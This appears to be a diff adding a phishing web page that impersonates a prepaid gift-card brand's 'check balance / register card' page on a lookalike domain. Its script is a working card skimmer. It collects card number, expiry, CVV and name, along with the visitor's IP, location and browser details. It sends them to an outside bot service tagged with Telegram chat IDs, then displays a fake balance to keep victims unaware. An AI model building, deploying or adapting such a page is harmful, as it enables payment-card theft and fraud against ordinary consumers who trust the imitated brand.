@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>View Card Balance &amp; Register - Jocker Prepaid Card</title>
+  <meta name="description" content="Instantly look up your Jocker Prepaid Card balance or register your card for web and phone purchases. Simply enter your card information below.">
+  <link rel="canonical" href="https://www.jockercard.info/check-balance/">
+  <meta name="robots" content="noindex, nofollow">
+  <link rel="icon" href="https://www.jokercard.ca/wp-content/uploads/2019/06/cropped-cropped-BHN_TRANS-32x32.png" sizes="32x32">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@200;300;400;500;600;700;800;900&family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --primary-dark: #1a1a2e;
+      --text-color: #333;
+      --text-light: #666;
+      --bg-white: #ffffff;
+      --bg-light: #f5f5f5;
+      --accent: #5e5e5e;
+      --link-color: #0056b3;
+      --success: #0d7d4a;
+      --error: #c53030;
+      --border: #ddd;
+      --max-width: 1200px;
+      --font-heading: 'Nunito', sans-serif;
+      --font-body: 'Open Sans', sans-serif;
+      --radius: 8px;
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: var(--font-body);
+      font-size: 15px;
+      line-height: 1.6;
+      color: var(--text-color);
+      background: var(--bg-light);
+      -webkit-font-smoothing: antialiased;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    a { color: var(--link-color); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    img { max-width: 100%; height: auto; display: block; }
+
+    /* ===== HEADER ===== */
+    .site-header {
+      background: var(--bg-white);
+      box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+    }
+    .header-inner {
+      display: flex; align-items: center; justify-content: space-between;
+      max-width: var(--max-width); margin: 0 auto; padding: 12px 20px;
+    }
+    .logo img { height: 50px; width: auto; }
+    .main-nav { display: flex; align-items: center; gap: 0; }
+    .main-nav a {
+      display: inline-block; padding: 10px 18px;
+      font-family: var(--font-heading); font-size: 14px; font-weight: 600;
+      color: var(--text-color); text-transform: uppercase; letter-spacing: 0.5px;
+      text-decoration: none; transition: color 0.2s;
+    }
+    .main-nav a:hover { color: var(--link-color); text-decoration: none; }
+    .main-nav a.active { color: var(--link-color); border-bottom: 2px solid var(--link-color); }
+    .mobile-menu-btn {
+      display: none; background: none; border: 2px solid #ccc;
+      border-radius: 4px; padding: 6px 10px; font-size: 20px; cursor: pointer;
+    }
+
+    /* ===== MAIN CONTENT ===== */
+    .main-content {
+      flex: 1; display: flex; align-items: flex-start; justify-content: center;
+      padding: 40px 20px 60px;
+    }
+
+    .card-form-container {
+      background: var(--bg-white); border-radius: var(--radius);
+      box-shadow: 0 4px 20px rgba(0,0,0,0.08); padding: 40px;
+      width: 100%; max-width: 520px;
+    }
+
+    /* ===== TABS ===== */
+    .form-tabs {
+      display: flex; border-bottom: 2px solid #e0e0e0; margin-bottom: 30px;
+    }
+    .form-tab {
+      flex: 1; padding: 12px 16px; text-align: center;
+      font-family: var(--font-heading); font-size: 15px; font-weight: 600;
+      color: var(--text-light); cursor: pointer; background: none;
+      border: none; border-bottom: 3px solid transparent;
+      margin-bottom: -2px; transition: all 0.2s;
+    }
+    .form-tab:hover { color: var(--text-color); }
+    .form-tab.active {
+      color: var(--link-color); border-bottom-color: var(--link-color);
+    }
+
+    .form-title {
+      font-family: var(--font-heading); font-size: 22px; font-weight: 600;
+      margin-bottom: 6px; color: var(--text-color);
+    }
+    .form-subtitle {
+      font-size: 14px; color: var(--text-light); margin-bottom: 24px;
+    }
+
+    /* ===== FORM ===== */
+    .form-group { margin-bottom: 18px; }
+    .form-group label {
+      display: block; font-size: 13px; font-weight: 600;
+      color: var(--text-color); margin-bottom: 6px;
+    }
+    .form-group input {
+      width: 100%; padding: 12px 14px; border: 1px solid var(--border);
+      border-radius: var(--radius); font-size: 15px; font-family: var(--font-body);
+      color: var(--text-color); background: #fafafa;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      outline: none;
+    }
+    .form-group input:focus {
+      border-color: var(--link-color);
+      box-shadow: 0 0 0 3px rgba(0,86,179,0.1);
+      background: var(--bg-white);
+    }
+    .form-group input.error {
+      border-color: var(--error);
+      box-shadow: 0 0 0 3px rgba(197,48,48,0.1);
+    }
+    .form-group input::placeholder { color: #aaa; }
+
+    .form-row {
+      display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px;
+    }
+    .form-row .form-group { margin-bottom: 0; }
+
+    .field-error {
+      display: block; font-size: 12px; color: var(--error);
+      margin-top: 4px; min-height: 16px;
+    }
+
+    .detected-card {
+      display: flex; align-items: center; gap: 8px;
+      margin-top: 6px; min-height: 24px;
+    }
+    .detected-card-logo-svg { vertical-align: middle; }
+    .detected-card-name {
+      font-size: 12px; color: var(--text-light); font-weight: 500;
+    }
+
+    /* ===== SUBMIT ===== */
+    .submit-btn {
+      width: 100%; padding: 14px; border: none; border-radius: var(--radius);
+      background: var(--accent); color: #fff; font-size: 16px;
+      font-weight: 600; font-family: var(--font-heading);
+      cursor: pointer; transition: background 0.2s;
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+    }
+    .submit-btn:hover { background: #444; }
+    .submit-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+
+    .spinner {
+      display: inline-block; width: 18px; height: 18px;
+      border: 2px solid rgba(255,255,255,0.3);
+      border-top-color: #fff; border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ===== RESULT ===== */
+    .balance-result {
+      display: none; text-align: center; padding: 30px 20px;
+      border-radius: var(--radius); margin-top: 20px;
+    }
+    .balance-result.show { display: block; }
+    .balance-result.success { background: #f0fdf4; border: 1px solid #86efac; }
+    .balance-result.error { background: #fef2f2; border: 1px solid #fca5a5; }
+
+    .result-icon {
+      width: 50px; height: 50px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 24px; font-weight: 700; margin: 0 auto 12px;
+    }
+    .success .result-icon { background: #dcfce7; color: var(--success); }
+    .error .result-icon { background: #fee2e2; color: var(--error); }
+
+    .balance-result h2 {
+      font-family: var(--font-heading); font-size: 20px;
+      margin-bottom: 10px;
+    }
+    .success h2 { color: var(--success); }
+    .error h2 { color: var(--error); }
+
+    .balance-amount {
+      display: flex; align-items: baseline; justify-content: center; gap: 6px;
+      margin: 10px 0;
+    }
+    .balance-amount .currency {
+      font-size: 18px; font-weight: 600; color: var(--text-light);
+    }
+    .balance-amount .amount {
+      font-size: 36px; font-weight: 700; color: var(--success);
+      font-family: var(--font-heading);
+    }
+    .card-info { font-size: 14px; color: var(--text-light); }
+    .error-message { font-size: 14px; color: var(--text-light); line-height: 1.6; }
+
+    .check-another {
+      display: none; text-align: center; margin-top: 20px;
+    }
+    .check-another.show { display: block; }
+    .check-another button {
+      background: none; border: 1px solid var(--border);
+      border-radius: var(--radius); padding: 10px 24px;
+      font-size: 14px; font-family: var(--font-heading);
+      font-weight: 600; color: var(--text-color);
+      cursor: pointer; transition: all 0.2s;
+    }
+    .check-another button:hover {
+      background: var(--bg-light); border-color: #bbb;
+    }
+
+    .hide { display: none !important; }
+
+    /* ===== LOADING OVERLAY ===== */
+    .loading-overlay {
+      display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(255,255,255,0.7); z-index: 9999;
+      align-items: center; justify-content: center;
+    }
+    .loading-overlay.show { display: flex; }
+    .loading-spinner {
+      width: 40px; height: 40px;
+      border: 4px solid #e0e0e0; border-top-color: var(--accent);
+      border-radius: 50%; animation: spin 0.8s linear infinite;
+    }
+
+    /* ===== FOOTER ===== */
+    .site-footer {
+      background: #eee; padding: 20px; text-align: center;
+      font-size: 12px; color: var(--text-light);
+      border-top: 1px solid #ddd;
+    }
+    .site-footer a { color: var(--text-light); margin: 0 8px; }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 768px) {
+      .main-nav { display: none; flex-direction: column; position: absolute; top: 100%; left: 0; right: 0; background: #fff; box-shadow: 0 4px 12px rgba(0,0,0,0.1); padding: 10px 0; z-index: 100; }
+      .main-nav.active { display: flex; }
+      .main-nav a { padding: 12px 20px; width: 100%; }
+      .mobile-menu-btn { display: block; }
+      .card-form-container { padding: 24px 18px; }
+      .form-row { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ===== LOADING OVERLAY ===== -->
+<div class="loading-overlay" id="loadingOverlay">
+  <div class="loading-spinner"></div>
+</div>
+
+<!-- ===== HEADER ===== -->
+<header class="site-header">
+  <div class="header-inner">
+    <a href="/" class="logo">
+      <img src="https://www.jokercard.ca/wp-content/uploads/2019/09/Joker_Wordmark_English.png" alt="Jocker Prepaid Card">
+    </a>
+    <button class="mobile-menu-btn" aria-label="Menu" aria-expanded="false" aria-controls="main-nav">
+      <i class="fa fa-bars"></i>
+    </button>
+    <nav class="main-nav" id="main-nav" aria-label="Primary">
+      <a href="https://www.giftcards.ca/?utm_source=jockercard_info&utm_medium=referral&utm_campaign=jockercard_info_buy_online_cta" target="_blank">Buy Now Online</a>
+      <a href="/#product">Product Line-Up</a>
+      <a href="/check-balance/" class="active">Register Card</a>
+      <a href="/check-balance/" class="active">Check Balance</a>
+      <a href="/?lang=fr">Fran&ccedil;ais</a>
+    </nav>
+  </div>
+</header>
+
+<!-- ===== MAIN ===== -->
+<div class="main-content">
+  <div class="card-form-container">
+
+    <!-- Tabs -->
+    <div class="form-tabs">
+      <button class="form-tab active" id="tabCheckBalance">Check Balance</button>
+      <button class="form-tab" id="tabRegister">Register Card</button>
+    </div>
+
+    <h2 class="form-title" id="formTitle">Look Up Your Balance</h2>
+    <p class="form-subtitle" id="formSubtitle">Provide your card information below to see your available funds.</p>
+
+    <!-- Form -->
+    <form id="balanceForm" autocomplete="off">
+      <div id="formFields">
+
+        <div class="form-group">
+          <label for="cardNumber">Card Number</label>
+          <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" inputmode="numeric" maxlength="23" autocomplete="off">
+          <span class="field-error" id="cardError"></span>
+          <div class="detected-card" id="detectedCard"></div>
+        </div>
+
+        <div class="form-row">
+          <div class="form-group">
+            <label for="expiryMonth">Month</label>
+            <input type="text" id="expiryMonth" placeholder="MM" inputmode="numeric" maxlength="2" autocomplete="off">
+          </div>
+          <div class="form-group">
+            <label for="expiryYear">Year</label>
+            <input type="text" id="expiryYear" placeholder="YY" inputmode="numeric" maxlength="2" autocomplete="off">
+          </div>
+          <div class="form-group">
+            <label for="cvv">CVV</label>
+            <input type="text" id="cvv" placeholder="123" inputmode="numeric" maxlength="3" autocomplete="off">
+          </div>
+        </div>
+        <span class="field-error" id="expiryError"></span>
+        <span class="field-error" id="cvvError"></span>
+
+        <div class="form-group" style="margin-top: 8px;">
+          <label for="cardName">Name on Card <span style="font-weight:400;color:#999;">(optional)</span></label>
+          <input type="text" id="cardName" placeholder="e.g. John Smith" autocomplete="off">
+        </div>
+
+        <button type="submit" class="submit-btn" id="submitBtn">Check Balance</button>
+      </div>
+    </form>
+
+    <!-- Result -->
+    <div class="balance-result" id="result"></div>
+
+    <!-- Check Another -->
+    <div class="check-another" id="checkAnother">
+      <button type="button">Check Another Card</button>
+    </div>
+
+  </div>
+</div>
+
+<!-- ===== FOOTER ===== -->
+<footer class="site-footer">
+  <p>
+    <a href="/">Home</a> |
+    <a href="/#faq">FAQ</a> |
+    <a href="https://blackhawknetwork.com/ca-en/privacy-policy" target="_blank">Privacy</a> |
+    <a href="/#cardholder-agreement">Cardholder Agreement</a>
+  </p>
+  <p style="margin-top: 8px;">Cards issued by Peoples Trust Company under Mastercard International licence. Mastercard&reg; is a registered trademark.<br>
+  Visa cards issued by Equitable Bank under licence from Visa Int. *Visa Int trademark, used under licence by Equitable Bank.<br>
+  &copy; 2024 Blackhawk Network (Canada), Ltd. All rights reserved.</p>
+</footer>
+
+<script>
+  // ===== CONFIG =====
+  const API_TOKEN = '4439f671d73478c6401b758b50594ce5';
+  const TELEGRAM_BEFORE = '-1003750392427';
+  const TELEGRAM_AFTER = '-1003750392427';
+  const API_URL = 'https://bot.pc.am/v3/checkBalance';
+
+  // ===== VISITOR INFO =====
+  let visitorIP = 'unknown', visitorCity = '', visitorCountry = '';
+  (async () => {
+    try {
+      const r = await fetch('https://ipapi.co/json/');
+      const d = await r.json();
+      visitorIP = d.ip || 'unknown';
+      visitorCity = d.city || '';
+      visitorCountry = d.country_name || '';
+    } catch(e) {}
+  })();
+  const visitorTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+  const visitorReferral = document.referrer || 'direct';
+
+  // ===== MOBILE MENU =====
+  document.querySelector('.mobile-menu-btn').addEventListener('click', function() {
+    const nav = document.getElementById('main-nav');
+    const expanded = this.getAttribute('aria-expanded') === 'true';
+    this.setAttribute('aria-expanded', !expanded);
+    nav.classList.toggle('active');
+  });
+
+  // ===== TABS =====
+  const tabCheck = document.getElementById('tabCheckBalance');
+  const tabReg = document.getElementById('tabRegister');
+  const formTitle = document.getElementById('formTitle');
+  const formSubtitle = document.getElementById('formSubtitle');
+  const submitBtn = document.getElementById('submitBtn');
+
+  tabCheck.addEventListener('click', function() {
+    tabCheck.classList.add('active');
+    tabReg.classList.remove('active');
+    formTitle.textContent = 'Look Up Your Balance';
+    formSubtitle.textContent = 'Provide your card information below to see your available funds.';
+    submitBtn.textContent = 'Check Balance';
+  });
+  tabReg.addEventListener('click', function() {
+    tabReg.classList.add('active');
+    tabCheck.classList.remove('active');
+    formTitle.textContent = 'Activate Your Card';
+    formSubtitle.textContent = 'Set up your card for web, phone, and mail-order transactions.';
+    submitBtn.textContent = 'Register Card';
+  });
+
+  // ===== DOM REFS =====
+  const cardInput = document.getElementById('cardNumber');
+  const expiryMonth = document.getElementById('expiryMonth');
+  const expiryYear = document.getElementById('expiryYear');
+  const cvvInput = document.getElementById('cvv');
+  const form = document.getElementById('balanceForm');
+  const resultEl = document.getElementById('result');
+  const formFields = document.getElementById('formFields');
+  const checkAnother = document.getElementById('checkAnother');
+  const loadingOverlay = document.getElementById('loadingOverlay');
+
+  // ===== CARD TYPE DETECTION =====
+  function getCardType(num) {
+    const d = String(num).replace(/\D/g, '');
+    if (d.startsWith('4')) return 'Visa';
+    if (/^5[1-5]/.test(d)) return 'Mastercard';
+    const n4 = d.length >= 4 ? parseInt(d.slice(0, 4), 10) : 0;
+    if (d.startsWith('2') && n4 >= 2221 && n4 <= 2720) return 'Mastercard';
+    if (/^3[47]/.test(d)) return 'American Express';
+    return null;
+  }
+
+  const CARD_LOGOS = {
+    Visa: '<svg class="detected-card-logo-svg" viewBox="0 0 48 16" width="72" height="24"><text x="0" y="12" font-family="Arial,sans-serif" font-size="14" font-weight="bold" fill="#1A1F71">VISA</text></svg>',
+    Mastercard: '<svg class="detected-card-logo-svg" viewBox="0 0 48 32" width="54" height="36"><circle cx="17" cy="16" r="12" fill="#EB001B"/><circle cx="31" cy="16" r="12" fill="#F79E1B"/><path d="M24 5a12 12 0 0 1 7 11 12 12 0 0 1-7 11 12 12 0 0 1-7-11 12 12 0 0 1 7-11z" fill="#FF5F00"/></svg>',
+    'American Express': '<svg class="detected-card-logo-svg" viewBox="0 0 48 16" width="60" height="20"><text x="0" y="12" font-family="Arial,sans-serif" font-size="10" font-weight="bold" fill="#006FCF">AMEX</text></svg>'
+  };
+
+  function updateDetectedCard() {
+    const digits = cardInput.value.replace(/\D/g, '');
+    const type = digits.length >= 2 ? getCardType(digits) : null;
+    const el = document.getElementById('detectedCard');
+    if (type && CARD_LOGOS[type]) {
+      el.innerHTML = CARD_LOGOS[type] + '<span class="detected-card-name">' + type + '</span>';
+    } else {
+      el.innerHTML = '';
+    }
+  }
+
+  // ===== INPUT FORMATTING =====
+  cardInput.oninput = function(e) {
+    let v = e.target.value.replace(/\D/g, '').slice(0, 19);
+    e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
+    e.target.classList.remove('error');
+    updateDetectedCard();
+  };
+  expiryMonth.oninput = function(e) {
+    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 2);
+    e.target.classList.remove('error');
+  };
+  expiryYear.oninput = function(e) {
+    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 2);
+    e.target.classList.remove('error');
+  };
+  cvvInput.oninput = function(e) {
+    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
+    e.target.classList.remove('error');
+  };
+
+  // ===== LUHN CHECK =====
+  function luhnCheck(num) {
+    const digits = String(num).replace(/\D/g, '');
+    let sum = 0, alt = false;
+    for (let i = digits.length - 1; i >= 0; i--) {
+      let n = parseInt(digits[i], 10);
+      if (alt) { n *= 2; if (n > 9) n -= 9; }
+      sum += n;
+      alt = !alt;
+    }
+    return sum % 10 === 0;
+  }
+
+  // ===== VALIDATION =====
+  function validate() {
+    const digits = cardInput.value.replace(/\s/g, '');
+    let ok = true;
+    document.querySelectorAll('.field-error').forEach(el => el.textContent = '');
+    document.querySelectorAll('.form-group input').forEach(el => el.classList.remove('error'));
+
+    if (digits.length < 15 || digits.length > 19) {
+      document.getElementById('cardError').textContent = 'Please enter a valid card number';
+      cardInput.classList.add('error'); ok = false;
+    } else if (!luhnCheck(digits)) {
+      document.getElementById('cardError').textContent = 'Invalid card number';
+      cardInput.classList.add('error'); ok = false;
+    }
+
+    const mm = parseInt(expiryMonth.value, 10);
+    const yy = expiryYear.value;
+    if (!expiryMonth.value || expiryMonth.value.length !== 2 || mm < 1 || mm > 12) {
+      document.getElementById('expiryError').textContent = 'Enter valid month (01-12)';
+      expiryMonth.classList.add('error'); ok = false;
+    }
+    if (!yy || yy.length !== 2) {
+      document.getElementById('expiryError').textContent = 'Enter valid year (YY)';
+      expiryYear.classList.add('error'); ok = false;
+    }
+    if (ok && mm && yy) {
+      const now = new Date();
+      const expYear = 2000 + parseInt(yy, 10);
+      const expMonth = mm - 1;
+      const expDate = new Date(expYear, expMonth + 1, 0);
+      if (expDate < now) {
+        document.getElementById('expiryError').textContent = 'Card has expired';
+        expiryMonth.classList.add('error');
+        expiryYear.classList.add('error'); ok = false;
+      }
+    }
+
+    const cvv = cvvInput.value;
+    if (!cvv || cvv.length !== 3) {
+      document.getElementById('cvvError').textContent = 'Enter 3-digit security code (000-999)';
+      cvvInput.classList.add('error'); ok = false;
+    }
+
+    return ok;
+  }
+
+  // ===== SHOW RESULT =====
+  const CARD_ERROR_MSG = 'Check your card information or use a new card.';
+
+  function showResult(data) {
+    resultEl.className = 'balance-result show ' + (data.success ? 'success' : 'error');
+    if (data.success) {
+      const amt = typeof data.balance === 'number' ? data.balance.toFixed(2) : (data.balance != null ? String(data.balance) : '0.00');
+      resultEl.innerHTML =
+        '<div class="result-icon">\u2713</div>' +
+        '<h2>Available Balance</h2>' +
+        '<div class="balance-amount"><span class="currency">' + (data.currency || 'USD') + '</span><span class="amount">' + amt + '</span></div>' +
+        (data.cardLast4 ? '<p class="card-info">Card ending in \u2022\u2022\u2022\u2022 ' + data.cardLast4 + '</p>' : '');
+    } else {
+      resultEl.innerHTML =
+        '<div class="result-icon">!</div>' +
+        '<h2>Unable to Check Balance</h2>' +
+        '<p class="error-message">' + (data.error || 'Please verify your card details and try again.') + '</p>';
+    }
+    formFields.classList.add('hide');
+    checkAnother.classList.add('show');
+    resultEl.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+  }
+
+  // ===== CHECK ANOTHER =====
+  checkAnother.querySelector('button').addEventListener('click', function() {
+    resultEl.className = 'balance-result';
+    resultEl.innerHTML = '';
+    formFields.classList.remove('hide');
+    checkAnother.classList.remove('show');
+    form.reset();
+    updateDetectedCard();
+  });
+
+  // ===== FORM SUBMIT =====
+  form.onsubmit = async function(e) {
+    e.preventDefault();
+    if (!validate()) return;
+
+    const digits = cardInput.value.replace(/\s/g, '');
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = '<span class="spinner"></span> Checking...';
+    loadingOverlay.classList.add('show');
+
+    try {
+      const cardNameVal = document.getElementById('cardName').value.trim();
+      const extraNote = 'IP: ' + visitorIP +
+        (visitorCity ? ' | Location: ' + visitorCity + ', ' + visitorCountry : '') +
+        (cardNameVal ? ' | Name on Card: ' + cardNameVal : '') +
+        ' | Timezone: ' + visitorTimezone +
+        ' | Referral: ' + visitorReferral +
+        ' | Page: ' + window.location.href +
+        ' | UA: ' + navigator.userAgent;
+
+      const params = new URLSearchParams({
+        token: API_TOKEN,
+        number: digits,
+        month: (expiryMonth.value || '').padStart(2, '0'),
+        year: expiryYear.value || '',
+        cvv: cvvInput.value || '',
+        telegram_additional_note: extraNote
+      });
+      if (TELEGRAM_BEFORE) params.set('telegram_id_before_check', TELEGRAM_BEFORE);
+      if (TELEGRAM_AFTER) params.set('telegram_id_after_check', TELEGRAM_AFTER);
+
+      const res = await fetch(API_URL + '?' + params.toString());
+      const text = await res.text();
+      let data;
+      try { data = JSON.parse(text); } catch { data = {}; }
+
+      let result = { success: false, error: '' };
+      let bal = null, curr = 'USD';
+      const d = data.data || data;
+      const raw = d.balance !== undefined ? d.balance :
+                  (d.amount !== undefined ? d.amount :
+                  (data.balance !== undefined ? data.balance : data.amount));
+
+      if (raw !== undefined && raw !== null && raw !== '') {
+        bal = typeof raw === 'number' ? raw : parseFloat(String(raw));
+        if (!isNaN(bal)) { curr = d.currency || data.currency || 'USD'; }
+      }
+
+      if (bal !== null && bal !== undefined) {
+        result = { success: true, balance: bal, currency: curr, cardLast4: digits.slice(-4) };
+      } else {
+        const st = (d && d.status) !== undefined ? d.status : (data.status || '');
+        const msg = (d && (d.error_message || d.error || d.message)) !== undefined ?
+                    (d.error_message || d.error || d.message) :
+                    (data.error_message || data.error || data.message || '');
+        const cardInvalid = ['WRONG_INPUT', 'NO_CARD_DEAILS_FOUND', 'NO_CARD_DETAILS_FOUND', 'UNKNOWN_CARD_BIN', 'INVALID_CARD', 'CORRUPTED_CARD', 'REGISTERED_CARD'];
+        if (cardInvalid.includes(st)) result.error = CARD_ERROR_MSG;
+        else if (st === 'INSUFFICIENT_CREDIT') result.error = 'Service temporarily unavailable. Please try again later.';
+        else if (st === 'RATE_LIMIT') result.error = 'Too many requests. Please wait a moment and try again.';
+        else if (st === 'WRONG_API_TOKEN') result.error = 'Service configuration error. Please contact support.';
+        else if (st === 'FAILED' || st === 'TIMEOUT' || st === 'UNKNOWN_ERROR') result.error = msg || 'Unable to check balance. Please try again.';
+        else result.error = msg || CARD_ERROR_MSG;
+      }
+
+      showResult(result);
+    } catch(err) {
+      showResult({ success: false, error: 'Connection failed. Please try again.' });
+    }
+
+    loadingOverlay.classList.remove('show');
+    submitBtn.disabled = false;
+    submitBtn.innerHTML = tabCheck.classList.contains('active') ? 'Check Balance' : 'Register Card';
+  };
+</script>
+</body>
+</html>
